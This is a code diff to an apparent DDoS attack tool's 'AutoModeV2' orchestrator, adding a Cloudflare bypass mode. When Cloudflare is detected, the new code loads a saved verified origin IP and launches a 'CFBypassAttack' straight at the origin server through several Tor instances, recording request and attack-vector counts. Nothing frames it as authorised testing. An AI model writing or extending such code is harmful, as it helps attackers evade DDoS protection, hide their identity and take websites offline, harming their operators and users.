@@ -61,6 +61,7 @@ from core.attack.strategies.cloudflare_bypass import (
     CFBypassOrchestrator,
     HTTP2FingerprintBypass,
 )
+from core.attack.strategies.cf_bypass_attack import CFBypassAttack
 
 logger = logging.getLogger("auto_mode_v2")
 
@@ -155,6 +156,10 @@ class AutoModeV2:
         # Cumulative result aggregation across workers
         self._final_metrics: Dict[str, Any] = {}
         self._workers_started_at: float = 0.0
+        
+        # Cloudflare bypass state
+        self._cf_detected: bool = False
+        self._origin_ip: Optional[str] = None
 
     # ------------------------------------------------------------------
     # Setup helpers
@@ -301,17 +306,53 @@ class AutoModeV2:
             # PHASE 0: RECON
             await self._phase_0_recon()
 
-            # PHASE 1-3: spawn workers and run through ramp
-            await self._spawn_workers()
-            await self._phase_1_warmup()
-            await self._phase_2_ramp()
-            await self._phase_3_peak()
+            # CF BYPASS PATH: if Cloudflare detected and origin known
+            if self._cf_detected and self._origin_ip:
+                self.dashboard.set_engine_label(f"cf_bypass -> {self._origin_ip}")
+                self.dashboard.set_global_note(
+                    f"CF BYPASS MODE | origin={self._origin_ip} | tor={len(self.proxy_urls)} proxies"
+                )
+                logger.info(f"Switching to CF bypass attack: {self._origin_ip}")
+                
+                # Extract hostname from target
+                parsed = urlparse(self.target)
+                hostname = parsed.hostname or self.target
+                port = parsed.port or (443 if parsed.scheme == "https" else 80)
+                use_https = parsed.scheme == "https"
+                
+                bypass = CFBypassAttack(
+                    target_domain=hostname,
+                    origin_ip=self._origin_ip,
+                    target_port=port,
+                    use_https=use_https,
+                    tor_instances=max(5, len(self.proxy_urls)) if self.proxy_urls else 5,
+                    tor_socks_base=9250,
+                )
+                
+                result = await bypass.start(duration=self.duration)
+                
+                self._final_metrics = {
+                    "engine": "cf_bypass",
+                    "target": self.target,
+                    "origin_ip": self._origin_ip,
+                    "duration": self.duration,
+                    "tor_instances": len(bypass.tor_proxies),
+                    "total_requests": result.total_requests,
+                    "failed_requests": result.failed_requests,
+                    "vectors_executed": result.vectors_executed,
+                }
+            else:
+                # PHASE 1-3: spawn workers and run through ramp
+                await self._spawn_workers()
+                await self._phase_1_warmup()
+                await self._phase_2_ramp()
+                await self._phase_3_peak()
 
-            # PHASE 4: VALIDATE (with ping check at midpoint)
-            await self._phase_4_validate()
+                # PHASE 4: VALIDATE (with ping check at midpoint)
+                await self._phase_4_validate()
 
-            # PHASE 5: COOLDOWN
-            await self._phase_5_cooldown()
+                # PHASE 5: COOLDOWN
+                await self._phase_5_cooldown()
         except KeyboardInterrupt:
             logger.warning("[v2] KeyboardInterrupt - shutting down workers")
             self.dashboard.set_global_note("INTERRUPTED by user")
@@ -373,10 +414,30 @@ class AutoModeV2:
         # Cloudflare detection
         cf_detector = CloudflareDetector()
         cf_result = await cf_detector.detect(self.target)
+        self._cf_detected = cf_result.is_cloudflare
+        self._origin_ip = None
+        
         if cf_result.is_cloudflare:
             note = f"CLOUDFLARE DETECTED ({cf_result.protection_level}) | ray={cf_result.ray_id[:16]}..."
             self.dashboard.set_global_note(note)
             logger.warning(f"Target behind Cloudflare: {cf_result.protection_level}")
+            
+            # Look up origin IP from saved origin data
+            parsed = urlparse(self.target)
+            hostname = parsed.hostname or self.target
+            origin_file = os.path.join("output", "origins", f"{hostname}.json")
+            if os.path.exists(origin_file):
+                try:
+                    with open(origin_file) as f:
+                        origin_data = json.load(f)
+                    if origin_data.get("status") == "VERIFIED" and origin_data.get("origin_ip"):
+                        self._origin_ip = origin_data["origin_ip"]
+                        logger.info(f"Found origin IP from saved data: {self._origin_ip}")
+                        self.dashboard.set_global_note(
+                            f"CF DETECTED | origin={self._origin_ip} | bypass target"
+                        )
+                except Exception as e:
+                    logger.debug(f"Origin data read error: {e}")
             
             # Try CF bypass via HTTP/2 fingerprint
             h2 = HTTP2FingerprintBypass()
